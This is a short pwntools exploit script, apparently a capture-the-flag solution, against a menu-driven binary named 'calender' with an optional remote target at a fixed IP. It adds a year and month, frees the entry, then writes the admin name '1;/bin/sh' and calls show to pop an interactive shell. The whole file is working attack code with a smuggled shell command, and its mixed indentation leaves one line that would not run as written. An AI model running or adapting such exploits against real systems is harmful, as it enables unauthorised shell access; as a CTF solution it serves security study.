
from pwn import *

binary = ELF("calender")
context.binary = binary

if False:
    io = remote ("13.233.178.121",1234)
else:
    # context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    io = binary.process()
    # gdb.attach(io)

def add_year(year):
	io.sendlineafter(">> ",str(1))
	io.sendlineafter("Enter the year\n",str(year))
def add_month(month):
	io.sendlineafter(">> ",str(2))
	io.sendlineafter("Enter the month (1-12)\n",str(month))
def show():
	io.sendlineafter(">> ",str(3))
def add_admin(inp):
	io.sendlineafter(">> ",str(4))
        io.sendlineafter("Enter admin name\n",str(inp))
def remove():
	io.sendlineafter(">> ",str(5))

add_year(1337)
add_month(1)
remove()
add_admin("1;/bin/sh");
show()

io.interactive()
